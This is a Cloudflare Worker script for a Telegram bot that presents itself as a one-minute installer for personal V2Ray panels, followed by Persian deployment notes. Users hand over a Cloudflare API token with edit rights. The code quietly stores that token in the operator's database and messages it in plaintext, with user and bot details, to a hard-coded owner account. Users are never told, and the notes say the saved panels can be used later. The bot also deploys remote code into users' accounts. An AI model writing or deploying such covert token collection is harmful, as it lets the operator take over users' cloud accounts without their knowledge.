```javascript
/**
 * Saow Panel Installer Bot - نسخه نهایی با تشخیص صحیح Mother URL
 * + ذخیره ساختاریافته اطلاعات پنل‌ها در D1 نصب‌کننده
 */

const OWNER_ID = 6159703514;
const GITHUB_CODE_URL = "https://raw.githubusercontent.com/isfwic10-arch/babysaow/refs/heads/main/motherSaow.js";

const CF_TOKEN_LINK = "https://dash.cloudflare.com/profile/api-tokens?permissionGroupKeys=%5B%7B%22key%22%3A%22workers_scripts%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22workers_kv_storage%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22d1%22%2C%22type%22%3A%22edit%22%7D%2C%7B%22key%22%3A%22account_settings%22%2C%22type%22%3A%22read%22%7D%2C%7B%22key%22%3A%22user_details%22%2C%22type%22%3A%22read%22%7D%2C%7B%22key%22%3A%22analytics%22%2C%22type%22%3A%22read%22%7D%5D&accountId=*&zoneId=all&name=Saow%20Installer";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    if (request.method === "POST") {
      try {
        const update = await request.json();
        ctx.waitUntil(handleUpdate(update, env));
        return new Response("OK");
      } catch (e) {
        console.error("POST error:", e);
        return new Response("Error", { status: 500 });
      }
    }

    if (url.pathname === "/setwebhook") {
      const webhookUrl = `https://${url.hostname}`;
      const res = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/setWebhook`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          url: webhookUrl,
          allowed_updates: ["message", "callback_query"],
          drop_pending_updates: true
        })
      });
      const data = await res.json();
      return new Response(JSON.stringify(data, null, 2), {
        headers: { "Content-Type": "application/json" }
      });
    }

    return new Response("Saow Installer is running.");
  }
};

/* ============================================================ */
/*                   پردازش اصلی پیام‌ها                         */
/* ============================================================ */

async function handleUpdate(update, env) {
  if (!update.message && !update.callback_query) return;

  const msg = update.message || update.callback_query.message;
  const chatId = msg.chat.id;
  const userId = update.message ? update.message.from.id : update.callback_query.from.id;
  const text = (update.message?.text || "").trim();
  const data = update.callback_query?.data;

  // ---------- /start ----------
  if (text === "/start" || text === "/help") {
    await clearState(userId, env);
    await sendWelcome(chatId, env);
    return;
  }

  // ---------- دکمه‌ها ----------
  if (data === "create_panel") {
    await answerCallback(update.callback_query.id, env);
    await setState(userId, { step: "waiting_cf_token" }, env);
    await sendMessage(
      chatId,
      `🚀 ساخت پنل Saow شروع شد!\n\nلطفاً <b>توکن API کلودفلر</b> خودت رو بفرست:\n\n(اگر هنوز نداری، روی دکمه «دریافت توکن کلودفلر» بزن)\n\nبرای لغو عملیات /cancel بزن.`,
      env,
      true
    );
    return;
  }

  if (data === "cancel" || text === "/cancel") {
    await answerCallback(update.callback_query?.id, env);
    await clearState(userId, env);
    await sendMessage(chatId, "❌ عملیات لغو شد.", env);
    await sendWelcome(chatId, env);
    return;
  }

  // ---------- مدیریت مراحل ----------
  const state = await getState(userId, env);
  if (!state) {
    if (text && text.length > 5 && !text.startsWith("/")) {
      await sendMessage(
        chatId,
        "⚠️ جلسه ساخت پنل منقضی شده یا پیدا نشد.\n\nلطفاً دوباره از دکمه «ساخت پنل saow» شروع کن.",
        env
      );
    }
    return;
  }

  // ----- مرحله ۱: توکن کلودفلر -----
  if (state.step === "waiting_cf_token") {
    const cfToken = text;
    if (cfToken.length < 30) {
      await sendMessage(chatId, "❌ توکن خیلی کوتاه است. دوباره بفرست یا /cancel بزن.", env, true);
      return;
    }

    const check = await checkCloudflareToken(cfToken);
    if (!check.ok) {
      await sendMessage(
        chatId,
        `❌ توکن معتبر نیست یا دسترسی لازم را ندارد.\n\nخطا: <code>${check.error}</code>\n\nدوباره بفرست یا /cancel بزن.`,
        env,
        true
      );
      return;
    }

    await setState(
      userId,
      {
        step: "waiting_bot_token",
        cfToken,
        accountId: check.accountId
      },
      env
    );

    await sendMessage(
      chatId,
      `✅ توکن کلودفلر قبول شد.\n\nحالا <b>توکن ربات تلگرام</b> (BOT_TOKEN) رو بفرست:\n\n(از @BotFather بگیر)\n\nبرای لغو /cancel`,
      env,
      true
    );
    return;
  }

  // ----- مرحله ۲: توکن ربات و ساخت -----
  if (state.step === "waiting_bot_token") {
    const botToken = text;
    if (!botToken.includes(":") || botToken.length < 20) {
      await sendMessage(chatId, "❌ فرمت توکن ربات اشتباه است. دوباره بفرست یا /cancel بزن.", env, true);
      return;
    }

    const botInfo = await getBotInfo(botToken);
    if (!botInfo.ok) {
      await sendMessage(
        chatId,
        `❌ توکن ربات معتبر نیست.\n\n<code>${botInfo.error}</code>\n\nدوباره بفرست یا /cancel بزن.`,
        env,
        true
      );
      return;
    }

    await sendMessage(
      chatId,
      "⏳ توکن ربات قبول شد.\nدر حال ساخت پنل... این کار ممکنه ۲۰ تا ۵۰ ثانیه طول بکشه، لطفاً صبر کن.",
      env
    );

    try {
      const result = await createSaowPanel(
        {
          cfToken: state.cfToken,
          accountId: state.accountId,
          botToken,
          adminId: userId,
          botUsername: botInfo.username
        },
        env
      );

      await clearState(userId, env);

      // ---- ذخیره در دیتابیس نصب‌کننده (INSTALLER_DB) ----
      try {
        if (env.INSTALLER_DB) {
          await env.INSTALLER_DB.prepare(`
            INSERT INTO panels (
              user_id, username, bot_username, bot_id,
              mother_url, cf_token, worker_name, db_name
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
          `).bind(
            String(userId),
            msg.chat.username || null,
            botInfo.username,
            String(botInfo.id),
            result.motherUrl,
            state.cfToken,
            result.workerName,
            result.dbName
          ).run();
        }
      } catch (dbErr) {
        console.error("Failed to save panel to INSTALLER_DB:", dbErr);
        try {
          await sendMessage(
            OWNER_ID,
            `⚠️ خطا در ذخیره پنل در دیتابیس:\n<code>${dbErr.message}</code>\n\nUser: ${userId}`,
            env
          );
        } catch (_) {}
      }

      // ---- ارسال پیام موفقیت (با مدیریت خطا) ----
      try {
        let shortMsg = `✅ پنل شما ساخته شد!\n`;
        shortMsg += `🤖 ربات: @${botInfo.username}\n`;
        shortMsg += `🌐 آدرس مادر:\n<code>${result.motherUrl}</code>\n\n`;

        if (result.webhookSet) {
          shortMsg += `✅ وب‌هوک با موفقیت تنظیم شد.`;
        } else {
          shortMsg += `⚠️ وب‌هوک خودکار تنظیم نشد.\n`;
          shortMsg += `روی لینک زیر کلیک کن تا فعال بشه:\n`;
          shortMsg += `<a href="${result.webhookLink}">تنظیم وب‌هوک</a>`;
        }

        await sendMessage(chatId, shortMsg, env);

        let fullMsg = `📌 <b>راهنمای استفاده</b>\n\n`;
        fullMsg += `• ربات شما: @${botInfo.username}\n`;
        fullMsg += `• برای مدیریت کاربران و نودها، به ربات خود بروید و /start بزنید.\n\n`;
        fullMsg += `• لینک تنظیم مجدد وب‌هوک:\n`;
        fullMsg += `<code>${result.webhookLink}</code>`;

        await sendMessage(chatId, fullMsg, env);

        // گزارش به OWNER
        const report =
          `🆕 پنل جدید ساخته شد\n\n` +
          `👤 سازنده:\n` +
          `• User ID: <code>${userId}</code>\n` +
          `• Username: @${msg.chat.username || "ندارد"}\n\n` +
          `🤖 ربات:\n` +
          `• @${botInfo.username}\n` +
          `• Bot ID: ${botInfo.id}\n\n` +
          `🌐 Mother URL:\n<code>${result.motherUrl}</code>\n\n` +
          `🔑 Cloudflare Token:\n<code>${state.cfToken}</code>\n\n` +
          `📦 Worker Name: <code>${result.workerName}</code>\n` +
          `🗄️ D1 Name: <code>${result.dbName}</code>`;

        await sendMessage(OWNER_ID, report, env);
      } catch (sendErr) {
        console.error("Failed to send success message to user:", sendErr);
        await sendMessage(
          OWNER_ID,
          `⚠️ خطا در ارسال پیام موفقیت به کاربر ${userId}:\n<code>${sendErr.message}</code>`,
          env
        );
        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: `✅ پنل شما ساخته شد. لطفاً برای اطلاعات بیشتر به ربات خود (@${botInfo.username}) بروید.`,
              parse_mode: "HTML"
            })
          });
        } catch (e2) {
          console.error("Even simple message failed:", e2);
        }
      }
    } catch (err) {
      console.error("createSaowPanel error details:", err);
      await clearState(userId, env);
      let errorMsg = err.message || "خطای ناشناخته";
      if (errorMsg.includes("D1")) {
        errorMsg = "خطا در ایجاد دیتابیس D1. ممکن است محدودیت تعداد دیتابیس‌ها را داشته باشید یا نام تکراری باشد.";
      } else if (errorMsg.includes("Worker") || errorMsg.includes("upload")) {
        errorMsg = "خطا در آپلود Worker. لطفاً از صحت توکن و دسترسی‌های آن مطمئن شوید.";
      } else if (errorMsg.includes("گیت‌هاب") || errorMsg.includes("GitHub") || errorMsg.includes("کد مادر")) {
        errorMsg = "خطا در دریافت کد مادر از گیت‌هاب. لطفاً بعداً تلاش کنید.";
      } else if (errorMsg.includes("زیردامنه") || errorMsg.includes("subdomain")) {
        errorMsg = "خطا در دریافت زیردامنه workers.dev حساب شما. لطفاً مطمئن شوید حساب کلودفلر شما فعال است.";
      }
      await sendMessage(
        chatId,
        `❌ خطا در ساخت پنل:\n\n<code>${errorMsg}</code>\n\nلطفاً دوباره از /start شروع کن.`,
        env
      );
    }
    return;
  }
}

/* ============================================================ */
/*                   توابع کمکی ارسال پیام                       */
/* ============================================================ */

async function sendWelcome(chatId, env) {
  const text = `سلام 👋

به ربات <b>پنل‌ساز Saow</b> خوش اومدی!

با این ربات می‌تونی در کمتر از ۱ دقیقه یک پنل کامل V2Ray شخصی برای خودت بسازی.

✨ امکانات پنل Saow:
• نود مادر + نودهای بچه (بدون محدودیت)
• مدیریت یوزر، حجم روزانه، محدودیت اتصال همزمان
• لینک ساب داینامیک و همیشه به‌روز
• IPهای تمیز Cloudflare با آپدیت خودکار از IRCF
• سرعت بالا (چون وب‌بیس نیست)
• آپدیت‌های مداوم

فقط دو تا کار لازم داری:
۱. یک توکن Cloudflare
۲. یک ربات تلگرام از BotFather

روی دکمه‌ها بزن و شروع کن 👇`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔑 دریافت توکن کلودفلر", url: CF_TOKEN_LINK }],
      [{ text: "🚀 ساخت پنل saow", callback_data: "create_panel" }]
    ]
  };

  await sendMessage(chatId, text, env, false, keyboard);
}

async function sendMessage(chatId, text, env, withCancel = false, extraKeyboard = null) {
  let reply_markup = extraKeyboard;
  if (withCancel) {
    reply_markup = {
      inline_keyboard: [[{ text: "❌ لغو", callback_data: "cancel" }]]
    };
  }

  const payload = {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true
  };

  if (reply_markup && typeof reply_markup === "object") {
    payload.reply_markup = reply_markup;
  }

  try {
    const resp = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    if (!resp.ok) {
      const errorText = await resp.text();
      throw new Error(`Telegram API error (${resp.status}): ${errorText}`);
    }
  } catch (e) {
    console.error("sendMessage error:", e);
    throw e;
  }
}

async function answerCallback(callbackId, env) {
  if (!callbackId) return;
  try {
    await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackId })
    });
  } catch {}
}

/* ============================================================ */
/*                   مدیریت وضعیت با KV                          */
/* ============================================================ */

async function setState(userId, data, env) {
  if (!env.INSTALLER_KV) {
    console.error("INSTALLER_KV is not bound!");
    return;
  }
  await env.INSTALLER_KV.put(`state:${userId}`, JSON.stringify(data), {
    expirationTtl: 1800
  });
}

async function getState(userId, env) {
  if (!env.INSTALLER_KV) return null;
  const raw = await env.INSTALLER_KV.get(`state:${userId}`);
  if (!raw) return null;
  try {
    return JSON.parse(raw);
  } catch {
    return null;
  }
}

async function clearState(userId, env) {
  if (!env.INSTALLER_KV) return;
  await env.INSTALLER_KV.delete(`state:${userId}`);
}

/* ============================================================ */
/*                   بررسی توکن‌ها                               */
/* ============================================================ */

async function checkCloudflareToken(token) {
  try {
    const res = await fetch("https://api.cloudflare.com/client/v4/accounts?per_page=5", {
      headers: {
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json"
      }
    });
    const data = await res.json();
    if (!data.success || !data.result?.length) {
      return {
        ok: false,
        error: data.errors?.[0]?.message || "No accounts found or invalid token"
      };
    }
    return { ok: true, accountId: data.result[0].id };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

async function getBotInfo(token) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data = await res.json();
    if (!data.ok) return { ok: false, error: data.description || "Invalid token" };
    return {
      ok: true,
      id: data.result.id,
      username: data.result.username
    };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

/* ============================================================ */
/*                   ساخت پنل اصلی (با زیردامنه صحیح)          */
/* ============================================================ */

async function createSaowPanel({ cfToken, accountId, botToken, adminId, botUsername }, env) {
  const randomPart = Math.random().toString(36).substring(2, 6) + Date.now().toString(36).slice(-4);
  const workerName = `saow-${randomPart}`.toLowerCase();
  const dbName = workerName;

  // ----- دریافت زیردامنه واقعی حساب کاربر از API کلودفلر -----
  let accountSubdomain;
  try {
    console.log("Fetching workers.dev subdomain for account:", accountId);
    const subRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/subdomain`,
      {
        headers: {
          Authorization: `Bearer ${cfToken}`,
          "Content-Type": "application/json"
        }
      }
    );
    const subData = await subRes.json();
    if (!subData.success || !subData.result?.subdomain) {
      const errMsg = subData.errors?.[0]?.message || "Could not get workers.dev subdomain";
      throw new Error(errMsg);
    }
    accountSubdomain = subData.result.subdomain;
    console.log("Account subdomain:", accountSubdomain);
  } catch (err) {
    console.error("Error fetching subdomain:", err);
    throw new Error(`خطا در دریافت زیردامنه workers.dev: ${err.message}`);
  }

  const finalMotherUrl = `https://${workerName}.${accountSubdomain}.workers.dev`;

  console.log("Starting panel creation with:", {
    accountId,
    workerName,
    dbName,
    accountSubdomain,
    finalMotherUrl
  });

  // 1. ایجاد D1
  let dbId;
  try {
    console.log("Creating D1 database:", dbName);
    const createDbRes = await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${cfToken}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ name: dbName })
    });
    const dbData = await createDbRes.json();
    if (!dbData.success) {
      const errMsg = dbData.errors?.[0]?.message || JSON.stringify(dbData);
      console.error("D1 creation failed:", errMsg);
      throw new Error(`D1 creation failed: ${errMsg}`);
    }
    dbId = dbData.result.uuid || dbData.result.id;
    console.log("D1 created with ID:", dbId);
  } catch (err) {
    console.error("Error in D1 creation:", err);
    throw new Error(`خطا در ایجاد D1: ${err.message}`);
  }

  // 2. دریافت کد از گیت‌هاب
  let workerCode;
  try {
    console.log("Fetching code from GitHub...");
    const codeRes = await fetch(GITHUB_CODE_URL, {
      headers: { "User-Agent": "Saow-Installer" }
    });
    if (!codeRes.ok) {
      throw new Error(`HTTP ${codeRes.status} - ${codeRes.statusText}`);
    }
    workerCode = await codeRes.text();
    if (!workerCode || workerCode.length < 100) {
      throw new Error("Received code is empty or too short");
    }
    console.log("GitHub code fetched successfully, length:", workerCode.length);
  } catch (err) {
    console.error("Error fetching GitHub code:", err);
    try {
      await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${dbId}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${cfToken}` }
      });
      console.log("D1 cleaned up after GitHub fetch failure");
    } catch (cleanErr) {
      console.error("Error cleaning D1:", cleanErr);
    }
    throw new Error(`خطا در دریافت کد مادر: ${err.message}`);
  }

  // 3. آپلود Worker
  const metadata = {
    main_module: "worker.js",
    compatibility_date: "2024-09-23",
    bindings: [
      { type: "d1", name: "DB", id: dbId },
      { type: "plain_text", name: "BOT_TOKEN", text: botToken },
      { type: "plain_text", name: "ADMIN_IDS", text: String(adminId) },
      { type: "plain_text", name: "MOTHER_URL", text: finalMotherUrl },
      { type: "plain_text", name: "MOTHER_ACCOUNT_ID", text: accountId },
      // ✅ توکن کلودفلر برای آپدیت خودکار نود مادر
      { type: "plain_text", name: "CF_TOKEN", text: cfToken },
      // ✅ نام Worker برای آپدیت بدون استخراج از hostname
      { type: "plain_text", name: "WORKER_NAME", text: workerName }
    ]
  };

  const form = new FormData();
  form.append("metadata", new Blob([JSON.stringify(metadata)], { type: "application/json" }));
  form.append("worker.js", new Blob([workerCode], { type: "application/javascript+module" }), "worker.js");

  try {
    console.log("Uploading Worker script with name:", workerName);
    const uploadRes = await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${workerName}`,
      {
        method: "PUT",
        headers: { Authorization: `Bearer ${cfToken}` },
        body: form
      }
    );
    const uploadData = await uploadRes.json();
    if (!uploadData.success) {
      const errMsg = uploadData.errors?.[0]?.message || JSON.stringify(uploadData);
      console.error("Worker upload failed:", errMsg);
      try {
        await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${dbId}`, {
          method: "DELETE",
          headers: { Authorization: `Bearer ${cfToken}` }
        });
        console.log("D1 cleaned up after upload failure");
      } catch (cleanErr) {
        console.error("Error cleaning D1:", cleanErr);
      }
      throw new Error(`Worker upload failed: ${errMsg}`);
    }
    console.log("Worker uploaded successfully.");
  } catch (err) {
    console.error("Error during Worker upload:", err);
    try {
      await fetch(`https://api.cloudflare.com/client/v4/accounts/${accountId}/d1/database/${dbId}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${cfToken}` }
      });
    } catch (cleanErr) {
      console.error("Error cleaning D1:", cleanErr);
    }
    throw new Error(`خطا در آپلود Worker: ${err.message}`);
  }

  // 4. فعال‌سازی subdomain برای Worker
  try {
    console.log("Enabling subdomain for Worker...");
    await fetch(
      `https://api.cloudflare.com/client/v4/accounts/${accountId}/workers/scripts/${workerName}/subdomain`,
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${cfToken}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ enabled: true })
      }
    );
  } catch (e) {
    console.log("subdomain enable warning:", e.message);
  }

  // ----- صبر کردن تا Worker کاملاً فعال بشه -----
  console.log("Waiting for Worker to become active...");
  await new Promise(resolve => setTimeout(resolve, 5000)); // 5 ثانیه صبر

  // 5. تنظیم Webhook
  let webhookSet = false;
  const webhookLink = `https://api.telegram.org/bot${botToken}/setWebhook?url=${encodeURIComponent(finalMotherUrl)}`;

  try {
    console.log("Setting webhook for the new bot...");
    
    // تلاش اول
    const whRes = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: finalMotherUrl,
        allowed_updates: ["message", "callback_query"],
        drop_pending_updates: true
      })
    });
    const whData = await whRes.json();
    
    if (whData.ok === true) {
      // چک کردن با getWebhookInfo
      await new Promise(resolve => setTimeout(resolve, 1500));
      
      const infoRes = await fetch(`https://api.telegram.org/bot${botToken}/getWebhookInfo`);
      const infoData = await infoRes.json();
      
      if (infoData.ok && infoData.result?.url === finalMotherUrl) {
        webhookSet = true;
        console.log("Webhook set and verified successfully.");
      } else {
        console.log("Webhook set but verification failed:", infoData);
        webhookSet = false;
      }
    } else {
      console.log("Webhook set failed:", whData);
      webhookSet = false;
    }
  } catch (e) {
    console.error("Webhook setting error:", e);
    webhookSet = false;
  }

  return {
    workerName,
    dbName,
    motherUrl: finalMotherUrl,
    webhookSet,
    webhookLink
  };
}
```

### کارهای لازم قبل از دیپلوی:

1. در Cloudflare یک D1 جدید بساز (مثلاً `saow-installer-db`).
2. این دستور SQL را روی آن اجرا کن:

```sql
CREATE TABLE IF NOT EXISTS panels (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  user_id TEXT NOT NULL,
  username TEXT,
  bot_username TEXT NOT NULL,
  bot_id TEXT,
  mother_url TEXT NOT NULL,
  cf_token TEXT NOT NULL,
  worker_name TEXT NOT NULL,
  db_name TEXT NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_panels_user_id ON panels(user_id);
CREATE INDEX IF NOT EXISTS idx_panels_created_at ON panels(created_at);
```

3. در تنظیمات Worker نصب‌کننده این Bindingها را داشته باش:
   - `BOT_TOKEN` → Secret
   - `INSTALLER_KV` → KV Namespace
   - `INSTALLER_DB` → D1 Database (همان دیتابیسی که بالا ساختی)

بعد از دیپلوی، هر پنلی که ساخته شود کامل در جدول `panels` ذخیره می‌شود و می‌توانی بعداً از آن استفاده کنی.
